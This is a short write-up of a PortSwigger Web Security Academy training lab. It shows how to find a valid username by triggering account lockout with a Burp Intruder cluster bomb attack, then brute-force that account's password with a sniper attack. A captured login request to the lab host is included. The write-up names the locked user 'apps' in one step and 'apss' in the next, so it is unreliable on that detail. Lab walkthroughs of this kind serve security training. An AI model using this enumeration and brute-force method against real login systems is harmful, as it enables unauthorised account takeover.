## Username enumeration via account lock

This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.


## Notes

- Possibility to leave a comment on a post
- /login

## Resume

1. Capture login request
2. Cluster bomb attack to lock account
3. Sniper attack to bruteforce password

## Solve 

The first step is to capture a login request. 

```
POST /login HTTP/2
Host: 0abe0046048efedf8076e9fa006300ed.web-security-academy.net
Cookie: session=4HQNYc1ExFJ8CA0fPw834xCZrIysTw9C
Content-Length: 27
Cache-Control: max-age=0
Sec-Ch-Ua: "Not-A.Brand";v="24", "Chromium";v="146"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Accept-Language: fr-FR,fr;q=0.9
Origin: https://0abe0046048efedf8076e9fa006300ed.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0abe0046048efedf8076e9fa006300ed.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Priority: u=0, i

username=user&password=password
```

Then we send it to **intruder** using a **Cluster bomb attack** with payload set on `§user§` and `§password§` then run the attack. After a few minutes filter by **Length** to see that the user **apps** has been locked : 

`You have made too many incorrect login attempts. Please try again in 1 minute(s).`

Then set the payload only on password with the wordlist **Candidate passwords** and run a sniper attack to bruteforce password : 

`username=apss&password=§password§`

Then filtler by **Length**, only one request does not have any error (length : 3266), check the request, go on portal and login using the password.